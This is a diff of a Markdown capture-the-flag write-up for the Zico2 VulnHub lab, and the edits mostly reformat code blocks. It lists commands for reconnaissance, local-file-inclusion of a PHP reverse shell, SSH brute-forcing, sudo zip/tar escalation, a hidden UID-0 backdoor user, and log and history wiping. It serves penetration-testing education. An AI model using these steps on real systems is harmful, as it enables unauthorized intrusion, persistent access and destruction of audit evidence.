@@ -1,6 +1,5 @@
 # Zico2 Writeup - Web Application Security
-
-Zico2 is an example of learning about penetration testing, a method of learning how to find vulnerabilities in a system. Simulations on ethical hacking, how we as pentesters can enter into a system by utilizing vulnerabilities that exist on the victim's website, as well as making security by patching existing vulnerabilities.
+A method of learning how to find vulnerabilities in a system. Simulations on ethical hacking, how we as pentesters can enter into a system by utilizing vulnerabilities that exist on the victim's website, as well as making security by patching existing vulnerabilities.
 
 ## Tools
 - dirbsearch
@@ -18,8 +17,7 @@ https://www.vulnhub.com/entry/zico2-1,210/
 ### Network Mapping
 ```
 nmap -A -v -T5 -sS 192.168.1.1
-```
-```
+
 -A = Enables OS detection and Version detection, Script scanning and Traceroute
 -v = Increase verbosity level (use twice or more for greater effect)
 -T5 = Set timing template (higher is faster)
@@ -34,8 +32,7 @@ telnet 192.168.1.1 22
 nc 192.168.1.1 80
 nc 192.168.1.1 22
 curl -I 192.168.1.1
-```
-```
+
 -I = Fetch the headers only!
 ```
 
@@ -43,8 +40,7 @@ curl -I 192.168.1.1
 ### Creating Reconnaissance Report
 ```
 nmap -A -v -T5 -sS 192.168.1.1 -oN 192.168.1.1-top10TCP.nmap
-```
-```
+
 --top-ports 10 = Scan 10 most common ports
 --open = Only show open (or possibly open) ports
 -Pn = Disabling host discovery
@@ -56,8 +52,7 @@ nmap -A -v -T5 -sS 192.168.1.1 -oN 192.168.1.1-top10TCP.nmap
 ### Web Object Scanning
 ```
 dirsearch -u http://192.168.1.1 -w /usr/share/dirb/wordlists/common.txt -e php
-```
-```
+
 -u = URL
 -w = Wordlists
 -e = Extensions
@@ -66,8 +61,7 @@ dirsearch -u http://192.168.1.1 -w /usr/share/dirb/wordlists/common.txt -e php
 ### Web Vulnerabilities Scanning
 ```
 uniscan -u 192.168.1.1 -qweds
-```
-```
+
 -u = URL
 -q = Enable Directory checks
 -w = Enable File checks
@@ -123,8 +117,7 @@ shell
 ```
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
-```
-```
+
 -c = Command
 pty = Pseudo-terminal utilities
 pty.spawn = Module for controling pseudo-terminal
@@ -149,31 +142,29 @@ vim /usr/databases/php_system_reverse_shell.php
 ### Accessing Reverse Shell
 ```
 nc -lvp 1234 / netcat -lvp 1234
-```
 
 -l = Listen mode
 -v = Prints status messages
 -p = Listened port
-
+```
 ```
 http://192.168.1.1/view.php?page=../../usr/databases/php_system_reverse_shell.php
 ```
 ```
 bash -i
-```
 
 -i = Shell is interactive
+```
 
 ## Gaining Access
 ```
 hydra -l root -P /opt/rockyou.txt ssh://192.168.1.1:22
-```
 
 -l = Username
 -P = Password list
 ssh = Protocol
 22 = Default port service
-
+```
 ```
 cd /home/zico/wordpress
 cat wp-config.php | grep DB_
@@ -187,7 +178,7 @@ define('DB_CHARSET', 'utf8');
 define('DB_COLLATE', '');
 ```
 ```
-ssh zico@192.168.88.161
+ssh zico@192.168.1.1
 ```
 
 ## Privilige Escalation
@@ -197,13 +188,12 @@ touch /tmp/privesc
 sudo -u root zip /tmp/privesc.zip /tmp/privesc -T --unzip-command="sh -c /bin/bash"
 sudo -u root tar cf /dev/null /tmp/privesc --checkpoint=1 --checkpoint-action=exec=/bin/bash
 sudo -u root zip /tmp/privesc.zip /tmp/privesc -T --unzip-command="python -c 'import pty; pty.spawn(\"/bin/sh\")'"
-```
 
 -l = List
 -u = User
 -T = Test  the integrity of the new zip file
 -i = Shell is interactive
-
+```
 ```
 bash -i
 whoami
@@ -216,11 +206,11 @@ id root
 useradd -ou 0 -g 0 zombie
 passwd zombie
 id zombie
-```
 
 -o = --non-unique (Duplicate User)
 -u = --uid (User ID) -> 0 (Root User) / 1000 (Sudo User)
 -g = --gid (Group ID)
+```
 
 ### Creating PHP Backdoored
 ```
@@ -246,8 +236,9 @@ cat /dev/null > /var/log/auth.log
 cat /dev/null > /var/log/apache2/access.log
 cat /dev/null > /var/log/apache2/error.log
 cat /dev/null > ~/.bash_history && history -c
-```
+
 -c = Clear the history list
+```
 
 ## Vulnerability Patching
 ### Vulnerable Code
